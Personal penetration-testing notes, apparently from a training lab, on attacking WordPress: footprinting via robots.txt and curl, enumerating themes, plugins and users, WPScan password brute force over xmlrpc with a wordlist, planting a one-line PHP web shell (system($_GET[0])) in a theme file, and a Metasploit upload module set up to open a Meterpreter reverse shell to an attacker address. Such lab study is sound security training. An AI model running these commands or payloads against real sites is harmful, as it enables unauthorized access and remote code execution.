# Wordpress Attacks

### Discovery/Footprinting

* Look into /robots.txt

```shell-session
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

Sitemap: https://inlanefreight.local/wp-sitemap.xml
```

* presence of the `/wp-admin` and `/wp-content` directories

### Enumeration

```shell-session
curl -s https://blog.inlanefreight.local | grep WordPress
```

```shell-session
<meta name="generator" content="WordPress 5.8" /
```

* themes

```shell-session
curl -s https://wehost.co.in/ | grep themes
```

* plugins

```shell-session
curl -s https://wehost.co.in/ | grep plugins
```

#### Enumerating Users

* login page can be found at `/wp-login.php`.
* A valid username and an invalid password results in the following message:
* ![Pasted image 20240815220135.png](app://7f05fcb686c7f91fc7f4865d993fb630b4f2/E:/NATHANIEL%20DATA/Personal/OneDrive/obsidian/Alex/Alex/09-Attachments/Pasted%20image%2020240815220135.png?1723739495261)
* an invalid username returns that the user was not found.
* ![Pasted image 20240815220145.png](app://7f05fcb686c7f91fc7f4865d993fb630b4f2/E:/NATHANIEL%20DATA/Personal/OneDrive/obsidian/Alex/Alex/09-Attachments/Pasted%20image%2020240815220145.png?1723739505568)

### WPScan

```shell-session
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>
```

```shell-session
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>
```

### Attacking WordPress

#### Login Bruteforce

* The `wp-login` method will attempt to brute force the standard WordPress login page, while the `xmlrpc` method uses WordPress API to make login attempts through `/xmlrpc.php`.
  * The `xmlrpc` method is preferred as it’s faster.

```shell-session
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

### Code Execution

```php
system($_GET[0]);
```

<figure><img src="../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

```shell-session
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

#### PHP Meterpreter shell

```shell-session
use exploit/unix/webapp/wp_admin_shell_upload 
```

```shell-session
set rhosts blog.inlanefreight.local
set username john
set password firebird1
set lhost 10.10.14.15
set rhost 10.129.42.195
set VHOST blog.inlanefreight.local
```

```shell-session
 show options 
```

```shell-session
exploit
```
